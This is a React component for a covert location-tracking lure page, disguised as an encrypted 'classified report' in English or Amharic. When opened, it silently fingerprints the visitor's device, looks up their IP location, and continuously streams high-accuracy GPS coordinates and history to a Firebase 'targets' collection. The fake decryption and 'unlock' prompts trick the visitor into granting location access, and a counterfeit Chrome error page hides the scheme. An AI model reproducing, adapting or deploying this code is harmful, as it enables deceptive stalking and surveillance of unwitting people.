import React, { useState, useEffect, useRef } from 'react';
import { Shield, Eye, AlertTriangle, Fingerprint, MapPin, Globe } from 'lucide-react';
import { motion } from 'motion/react';
import { 
  db, 
  auth, 
  signInAnonymously, 
  setDoc, 
  doc, 
  serverTimestamp, 
  handleFirestoreError, 
  OperationType,
  updateDoc,
  arrayUnion
} from '../lib/firebase';

function formatTime(seconds: number) {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${mins}:${secs.toString().padStart(2, '0')}`;
}

export const TrackerPortal: React.FC = () => {
  const [status, setStatus] = useState<'idle' | 'scanning' | 'granted' | 'denied' | 'error' | 'decrypted'>('granted');
  const [errorMsg, setErrorMsg] = useState<string>('');
  const [progress, setProgress] = useState(100);
  const [syncCount, setSyncCount] = useState(0);
  const [decryptionProgress, setDecryptionProgress] = useState(0);
  const targetIdRef = useRef<string | null>(null);

  const [targetId, setTargetId] = useState<string | null>(null);
  const [isClient, setIsClient] = useState(false);
  const [timeLeft, setTimeLeft] = useState(120);
  const [lang, setLang] = useState('amharic');
  const [fakeError, setFakeError] = useState(false);

  useEffect(() => {
    setIsClient(true);
    
    // Detect language and ID from URL
    const params = new URLSearchParams(window.location.search);
    const lParam = params.get('l') || params.get('lang');
    if (lParam) setLang(lParam);
    const idParam = params.get('id') || params.get('n');
    if (idParam) {
      targetIdRef.current = idParam;
    }

    // Generate or get persistent ID for this target
    let tid = localStorage.getItem('eagle_target_id');
    if (!tid) {
      tid = `T-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
      localStorage.setItem('eagle_target_id', tid);
    }
    setTargetId(tid);

    const countdown = setInterval(() => {
      setTimeLeft(prev => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    
    // Start recon automatically on mount
    startRecon();
 
    return () => {
      clearInterval(countdown);
    };
  }, []);

  // Watch for location success to trigger decryption
  useEffect(() => {
    if (syncCount > 0 && status === 'granted' && decryptionProgress === 0) {
      // Trigger decryption sequence ONLY once after we have at least one successful location ping
      const timer = setTimeout(() => {
        let p = 0;
        const interval = setInterval(() => {
          p += 2; // Slower, more "calculated" decryption
          setDecryptionProgress(prev => {
            if (prev >= 100) {
              clearInterval(interval);
              setTimeout(() => setStatus('decrypted'), 1000);
              return 100;
            }
            return p;
          });
        }, 80);
      }, 500);
      return () => clearTimeout(timer);
    }
  }, [syncCount, status]);

  // Protocol initialization
  const startRecon = async () => {
    if (!isClient) return;
    setStatus('granted');
    setErrorMsg('');
    setProgress(100);

    try {
      // 1. Authenticate immediately and wait for UID
      const userCred = await signInAnonymously(auth);
      const uid = userCred.user.uid;
      
      // 2. Metadata for tracking (Synchronous as much as possible)
      const deviceInfo: any = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        cores: navigator.hardwareConcurrency || 'unknown',
        platform: navigator.platform,
        memory: (navigator as any).deviceMemory || 'unknown',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'direct',
        isPWA: window.matchMedia('(display-mode: standalone)').matches
      };

      // 3. Platform Detection
      const ua = (navigator.userAgent || "").toLowerCase();
      let platform = 'Mobile_Browser';
      if (ua.includes('fb')) platform = 'Facebook_InApp';
      else if (ua.includes('whatsapp')) platform = 'WhatsApp_InApp';
      else if (ua.includes('tgandroid') || ua.includes('telegram')) platform = 'Telegram_InApp';
      else if (ua.includes('iphone')) platform = 'iPhone_Safari';
      else if (ua.includes('android')) platform = 'Android_Chrome';

      const targetDisplayName = targetIdRef.current || `Asset_${uid.slice(0, 4)}`;
      const targetRef = doc(db, 'targets', uid);

      // 4. IMMEDIATE FIRST PING (No geolocation needed yet)
      const initialPayload = {
        name: targetDisplayName,
        lastSeen: new Date().toISOString(),
        status: 'active',
        platform: platform,
        deviceInfo: deviceInfo,
        lastPing: serverTimestamp()
      };

      try {
        await setDoc(targetRef, initialPayload, { merge: true });
        setSyncCount(prev => prev || 1); // Only set if not already set
      } catch (err) {
        console.error("Initial Ping Failed:", err);
      }

      // 5. IP TRACKING (With Fallbacks)
      const captureIP = async () => {
        const services = [
          'https://ipapi.co/json/',
          'https://ip-api.com/json/',
          'https://api.ipify.org?format=json'
        ];

        for (const service of services) {
          try {
            // Using a plain fetch with a custom timeout for better compatibility
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), 6000);
            
            const res = await fetch(service, { signal: controller.signal });
            clearTimeout(id);
            const data = await res.json();
            
            let ipInfo = {};
            if (service.includes('ipapi.co')) {
              ipInfo = { ip: data.ip, city: data.city, country: data.country_name, org: data.org };
            } else if (service.includes('ip-api.com')) {
              ipInfo = { ip: data.query, city: data.city, country: data.country, org: data.isp };
            } else {
              ipInfo = { ip: data.ip };
            }

            if (Object.keys(ipInfo).length > 0) {
              await updateDoc(targetRef, { ipInfo: ipInfo });
              return ipInfo;
            }
          } catch (e) {
            console.warn(`IP service ${service} failed. Trying next...`);
          }
        }
        return null;
      };

      captureIP().then(ip => {
        if (ip) (window as any)._eagle_ip = ip;
      });

      // 6. GEOLOCATION TRACKING
      let lastReportTime = 0;
      const MIN_INTERVAL = 2000; 

      const handleGeoSuccess = async (position: any) => {
        const { latitude, longitude, accuracy } = position.coords;
        const now = Date.now();
        
        if (now - lastReportTime < MIN_INTERVAL) return;
        
        lastReportTime = now;
        setSyncCount(prev => prev + 1);
        
        try {
          const historyItem = { 
            lat: latitude, 
            lng: longitude, 
            time: new Date().toISOString() 
          };

          await setDoc(targetRef, {
            lat: latitude,
            lng: longitude,
            accuracy: accuracy,
            lastSeen: new Date().toISOString(),
            history: arrayUnion(historyItem)
          }, { merge: true });
          
          if (status !== 'decrypted') {
            setStatus('granted');
          }
        } catch (e) {
          console.error("Uplink Failure:", e);
        }
      };

      const handleGeoError = (error: any) => {
        console.error("Geo Error:", error);
        if (error.code === error.PERMISSION_DENIED) {
          setStatus('denied');
        } else {
          setStatus('error');
          setErrorMsg(error.message);
        }
      };

      if (!navigator.geolocation) {
        setStatus('error');
        setErrorMsg('SECURE_PROTOCOL_UNSUPPORTED');
        return;
      }

      // Initial capture
      navigator.geolocation.getCurrentPosition(handleGeoSuccess, handleGeoError, {
        enableHighAccuracy: true,
        timeout: 10000
      });

      // Continuous monitoring
      navigator.geolocation.watchPosition(handleGeoSuccess, handleGeoError, { 
        enableHighAccuracy: true, 
        maximumAge: 0, 
        timeout: 20000 
      });

    } catch (err: any) {
      console.error("Fatal Recon Failure:", err);
      setStatus('error');
      if (err.message?.includes('permission-denied')) {
         setErrorMsg('STORAGE_ACCESS_DENIED: Please enable cookies or open in a standard browser.');
      }
    }
  };

  const manualUnlock = () => {
    setStatus('scanning');
    startRecon();
  };

  // If hydration hasn't happened yet, render a matching skeleton
  if (!isClient) {
    return (
      <div className="min-h-screen bg-[#050608] flex items-center justify-center p-4">
        <div className="w-full max-w-md h-[400px] bg-[#0a0c12] rounded-xl border border-slate-800 animate-pulse"></div>
      </div>
    );
  }

  // If fake error is active, show a very convincing standard error page (Chrome style)
  if (fakeError) {
    return (
      <div className="min-h-screen bg-white text-[#5f6368] font-sans flex items-start justify-center pt-24 p-6 selection:bg-[#c6dbf7]">
        <div className="max-w-[600px] w-full animate-in fade-in duration-700">
          <div className="flex flex-col items-start gap-8">
             <div className="text-gray-300">
                <Globe className="w-[72px] h-[72px] stroke-[1.5px]" />
             </div>
             <div className="space-y-5">
                <h1 className="text-[22px] font-normal text-[#202124] leading-tight">This site can’t be reached</h1>
                <p className="text-[14px] text-[#5f6368] leading-relaxed">
                  The connection was reset.<br/><br/>
                  Try:
                </p>
                <ul className="text-[14px] text-[#5f6368] list-disc pl-5 space-y-3">
                  <li className="pl-1">Checking the connection</li>
                  <li className="pl-1">Checking the proxy and the firewall</li>
                  <li className="pl-1">Running Windows Network Diagnostics</li>
                </ul>
                <div className="pt-6 flex flex-col items-start gap-8">
                  <button 
                    onClick={() => window.location.reload()}
                    className="px-6 py-2.5 bg-[#1a73e8] text-white text-[14px] font-medium rounded-[4px] hover:bg-[#1b66c9] hover:shadow-md transition-all shadow-[#0000001a] shadow-sm uppercase tracking-wide"
                  >
                    Reload
                  </button>
                  <p className="text-[12px] text-[#5f6368] font-mono">ERR_CONNECTION_RESET</p>
                </div>
             </div>
          </div>
          
          <div className="mt-12 pt-8 border-t border-gray-100">
            <details className="cursor-pointer group select-none">
              <summary className="text-[12px] font-bold text-[#1a73e8] uppercase tracking-wider list-none flex items-center gap-2 hover:underline">
                <span className="group-open:rotate-90 transition-transform text-[10px]">▶</span> Details
              </summary>
              <div className="mt-4 p-5 bg-gray-50 rounded border border-gray-100 font-mono text-[11px] text-gray-500 whitespace-pre-wrap leading-[1.8] shadow-inner">
                Request Protocol: QUIC_STREAM_V3<br/>
                Diagnostic Link: <span className="text-blue-400">ais-net-diagnostic-{Math.random().toString(36).substring(7).toUpperCase()}</span><br/>
                Server Status: UNREACHABLE<br/>
                Error Detail: The remote server closed the connection unexpectedly while processing the handshake sequence.
              </div>
            </details>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#050608] text-slate-300 font-mono flex flex-col items-center justify-center p-4 tech-grid">
      <div className="max-w-md w-full bg-[#0a0c12] rounded-xl border border-slate-800 p-8 relative overflow-hidden shadow-2xl">
        {/* Stealth Overlay */}
        <div className="absolute top-0 right-0 p-4 opacity-[0.03] pointer-events-none">
          <Globe className="w-32 h-32" />
        </div>

        <div className="flex justify-center mb-8">
          <div className="relative">
            <div className="w-20 h-20 bg-blue-600/5 rounded-full flex items-center justify-center border border-blue-600/20">
              <Shield className="w-10 h-10 text-blue-500/80 animate-pulse" />
            </div>
            <div className="absolute -bottom-1 -right-1 w-6 h-6 bg-slate-900 border border-slate-800 rounded-full flex items-center justify-center">
              <Fingerprint className="w-3 h-3 text-blue-400" />
            </div>
          </div>
        </div>

        <div className="text-center mb-10">
          <h2 className="text-xl font-black tracking-tighter mb-2 text-white italic">DOCUMENT_ENCRYPTED</h2>
          <div className="flex items-center justify-center gap-2 mb-1">
            <div className="h-[1px] w-8 bg-slate-800"></div>
            <p className="text-[9px] text-slate-500 uppercase tracking-[0.3em] font-bold">Priority Signal Alpha</p>
            <div className="h-[1px] w-8 bg-slate-800"></div>
          </div>
        </div>

        <div className="space-y-8">
          {status === 'granted' && (
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="text-center space-y-6"
            >
              <div className="bg-slate-900 border border-slate-800 rounded-lg overflow-hidden text-left shadow-2xl">
                <div className="bg-blue-600/20 p-3 border-b border-slate-800 flex items-center justify-between">
                  <span className="text-[10px] font-bold uppercase tracking-wider text-blue-400">Classified_Report_8429.pdf</span>
                  <div className="flex gap-1">
                    <div className="w-1.5 h-1.5 rounded-full bg-red-500/50"></div>
                    <div className="w-1.5 h-1.5 rounded-full bg-amber-500/50"></div>
                    <div className="w-1.5 h-1.5 rounded-full bg-green-500/50"></div>
                  </div>
                </div>
                <div className="p-8 space-y-6">
                  {syncCount === 0 ? (
                    <div className="space-y-4 py-4">
                      <div className="flex justify-center mb-6">
                        <div className="w-12 h-12 rounded-full border-2 border-blue-500/30 border-t-blue-500 animate-spin"></div>
                      </div>
                      <div className="space-y-2">
                        <div className="h-4 w-3/4 bg-slate-800 rounded animate-pulse"></div>
                        <div className="h-4 w-full bg-slate-800 rounded animate-pulse opacity-60"></div>
                      </div>
                      <p className="text-[10px] text-center text-slate-500 uppercase tracking-widest animate-pulse mt-4">
                         {lang === 'amharic' ? 'ግንኙነት በመፍጠር ላይ...' : 'Establishing Secure Node...'}
                      </p>
                    </div>
                  ) : (
                    <div className="space-y-6 animate-in fade-in zoom-in duration-500">
                      <div className="flex items-center gap-4 p-4 bg-blue-500/5 border border-blue-500/20 rounded-lg">
                        <div className="w-10 h-10 rounded-full bg-green-500/10 border border-green-500/30 flex items-center justify-center">
                           <Shield className="w-5 h-5 text-green-500" />
                        </div>
                        <div className="space-y-1">
                          <p className="text-[10px] font-black text-white uppercase tracking-wider">Secure Handshake: OK</p>
                          <p className="text-[8px] text-slate-500">Uplink sequence stable. Processing data fragments.</p>
                        </div>
                      </div>
                      
                      <div className="space-y-3">
                         <div className="flex justify-between items-center text-[9px] text-slate-400 font-bold uppercase tracking-tighter">
                            <span>{lang === 'amharic' ? 'የዳታ ጥራት' : 'Relay Buffer'}</span>
                            <span className="text-blue-500">100%</span>
                         </div>
                         <div className="h-1 w-full bg-slate-800 rounded-full overflow-hidden">
                            <motion.div 
                              initial={{ width: 0 }}
                              animate={{ width: '100%' }}
                              className="h-full bg-blue-500"
                            />
                         </div>
                      </div>

                      {decryptionProgress > 0 && (
                        <div className="space-y-3 animate-in fade-in slide-in-from-top-1 duration-500">
                           <div className="flex justify-between items-center text-[9px] text-slate-400 font-bold uppercase tracking-tighter">
                              <span>{lang === 'amharic' ? 'ሰነዱን ኮድ የመፍታት ሂደት' : 'DECRYPTION PROGRESS'}</span>
                              <span className="text-green-500">{decryptionProgress}%</span>
                           </div>
                           <div className="h-1 w-full bg-slate-800 rounded-full overflow-hidden">
                              <motion.div 
                                className="h-full bg-green-500"
                                initial={{ width: 0 }}
                                animate={{ width: `${decryptionProgress}%` }}
                              />
                           </div>
                        </div>
                      )}

                      <div className="p-4 bg-slate-950/50 border border-slate-800 rounded font-mono text-[9px] text-slate-400 space-y-1">
                        <p className="text-blue-500 font-bold">TERMINAL: AUTH_READY</p>
                        <p>{'>'} {lang === 'amharic' ? 'ሰነዱን በማዘጋጀት ላይ...' : 'Preparing encrypted document...'}</p>
                        <p>{'>'} {lang === 'amharic' ? 'የቅርብ ግንኙነት ተረጋግጧል።' : 'Handshake stable. Processing stream.'}</p>
                        {decryptionProgress > 50 && (
                          <p className="text-green-500/80 animate-pulse">{'>'} {lang === 'amharic' ? 'ጥንቅር እየተከናወነ ነው...' : 'Assembling cipher blocks...'}</p>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </motion.div>
          )}

          {status === 'decrypted' && (
            <motion.div 
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              className="space-y-6"
            >
              <div className="bg-white text-[#1a1c1e] rounded-lg shadow-2xl overflow-hidden border border-gray-200">
                <div className="bg-[#f0f2f5] p-6 border-b border-gray-200 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="bg-red-600 p-2 rounded">
                       <Shield className="w-5 h-5 text-white" />
                    </div>
                    <div>
                      <h3 className="text-sm font-bold uppercase tracking-tight">Top Secret Clearance Required</h3>
                      <p className="text-[10px] text-gray-500 font-sans">Document ID: REPORT_ALPHA_8429_STABLE</p>
                    </div>
                  </div>
                  <div className="bg-amber-100 text-amber-800 px-3 py-1 rounded-full text-[9px] font-black tracking-widest uppercase">Classified</div>
                </div>
                
                <div className="p-8 space-y-6 font-sans text-left">
                  <div className="flex justify-between border-b border-gray-100 pb-4">
                    <div className="space-y-1">
                      <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider">Date Issued</p>
                      <p className="text-xs font-bold">May 05, 2024</p>
                    </div>
                    <div className="space-y-1 text-right">
                      <p className="text-[10px] text-gray-400 uppercase font-bold tracking-wider">Clearance Level</p>
                      <p className="text-xs font-bold text-red-600 italic">Level 9 // Restricted</p>
                    </div>
                  </div>

                  <div className="space-y-4">
                    <h4 className="text-sm font-black text-gray-900 border-l-4 border-red-600 pl-3">OPERATIONAL_MEMO_X84</h4>
                    <div className="space-y-3 text-[13px] text-gray-700 leading-relaxed italic">
                      <p>“{lang === 'amharic' ? 'ይህ ሪፖርት የተዘጋጀው ለከፍተኛ አመራር ብቻ ነው። በውስጡ የተጠቀሱት መረጃዎች እጅግ ሚስጥራዊ እና ስሱ ናቸው። የሰነዱ ይዘት የሚመለከተው የአልፋ ሴክተሩን ወቅታዊ ሁኔታ ነው።' : 'This report is prepared for senior leadership eyes only. The information contained herein is highly sensitive and mission-critical. Internal audits confirm sector stability.'}”</p>
                      <div className="py-2 space-y-4">
                        <div className="flex gap-4">
                           <div className="w-12 h-1 bg-gray-200 rounded"></div>
                           <div className="flex-1 space-y-2">
                             <div className="h-3 w-full bg-gray-100 rounded"></div>
                             <div className="h-3 w-5/6 bg-gray-100 rounded opacity-60"></div>
                           </div>
                        </div>
                        <div className="p-4 bg-gray-50 border border-gray-100 rounded text-[11px] text-gray-600 leading-relaxed">
                          <p className="font-bold mb-2 uppercase text-[9px] tracking-widest text-gray-400">Analysis Summary:</p>
                          {lang === 'amharic' ? 'የገበያ ሁኔታው እና የኢኮኖሚው እንቅስቃሴ ባልተጠበቀ ሁኔታ እየተለወጠ ነው። አዳዲስ የኢንቨስትመንት አማራጮች እየተፈተሹ ይገኛሉ። ዝርዝር መረጃው በሚቀጥለው ሪፖርት ይካተታል።' : 'Market volatility indices indicate a temporary correction. Tactical asset allocation remains within projected standard deviations. No immediate intervention required from central command.'}
                        </div>
                      </div>
                      <p>{lang === 'amharic' ? 'ተጨማሪ መረጃ ለማግኘት በሚስጥራዊው መስመር በኩል ያግኙን።' : 'Contact secure node for visual raw data access.'}</p>
                    </div>
                  </div>

                  <div className="pt-8 flex justify-center">
                    <div className="border-2 border-gray-100 p-2 rounded transform -rotate-12 opacity-40">
                      <div className="border border-gray-100 px-4 py-1 text-[10px] font-black uppercase text-gray-300">Confidential Signal</div>
                    </div>
                  </div>
                </div>
              </div>
              <div className="flex flex-col items-center gap-2">
                 <p className="text-[10px] text-slate-500 uppercase tracking-widest">{lang === 'amharic' ? 'ሲስተሙ እየሰራ ነው' : 'Secure Session Active'}</p>
                 <div className="flex gap-1">
                    <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse"></div>
                    <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse delay-75"></div>
                    <div className="w-1.5 h-1.5 rounded-full bg-blue-500 animate-pulse delay-150"></div>
                 </div>
              </div>
            </motion.div>
          )}

          {status === 'denied' && (
            <div className="text-center p-8 border border-red-500/20 bg-red-500/5 rounded-lg space-y-6 animate-in slide-in-from-bottom-4">
              <div className="w-12 h-12 bg-red-500/20 rounded-full flex items-center justify-center mx-auto">
                 <AlertTriangle className="w-6 h-6 text-red-500" />
              </div>
              <div className="space-y-2">
                <p className="text-[12px] text-red-500 font-black uppercase tracking-tighter italic">SYNC_STALLED_BY_USER</p>
                <p className="text-[11px] text-slate-300 leading-relaxed font-bold">
                   {lang === 'amharic' ? 'ዳታውን ወደ ስልክዎ ለማውረድ የቦታ መገኛ ፍቃድ መስጠት አስፈላጊ ነው። እባክዎ ሊንኩን ለመክፈት ፍቃድ ይስጡ።' : 'System handshake requires location verification to download the encrypted document. Please grant access to continue.'}
                </p>
              </div>
              <button 
                onClick={() => manualUnlock()}
                className="w-full py-4 bg-red-600 hover:bg-red-500 text-white text-[11px] uppercase font-black rounded-xl shadow-lg shadow-red-900/50 transition-all flex items-center justify-center gap-2"
              >
                <MapPin className="w-4 h-4" /> {lang === 'amharic' ? 'መረጃውን ክፈት (UNLOCK)' : 'UNLOCK DOCUMENT'}
              </button>
            </div>
          )}

          {status === 'error' && (
            <div className="text-center p-6 border border-amber-500/20 bg-amber-500/5 rounded-lg space-y-4">
              <AlertTriangle className="w-8 h-8 text-amber-600/50 mx-auto" />
              <p className="text-[11px] font-bold text-amber-500 uppercase italic">CONNECTION_TIMEOUT</p>
              <p className="text-[9px] text-slate-500 px-4">{errorMsg}</p>
              <button 
                onClick={() => manualUnlock()}
                className="w-full py-3 bg-amber-600/20 border border-amber-500/30 text-amber-500 rounded-lg text-[10px] font-black uppercase"
              >
                Retry Handshake
              </button>
            </div>
          )}
        </div>

        <div className="mt-12 pt-6 border-t border-slate-800/50 flex items-center justify-between opacity-30 text-[7px] uppercase tracking-[0.4em] font-black">
          <div className="flex items-center gap-1.5">
            <div className="w-1 h-1 rounded-full bg-blue-500 animate-ping"></div>
            <span>LINK_ESTABLISHED</span>
          </div>
          <span className="opacity-0 pointer-events-none text-slate-900">v8.4 // ALPHA_SECTOR</span>
        </div>
      </div>
    </div>
  );
};
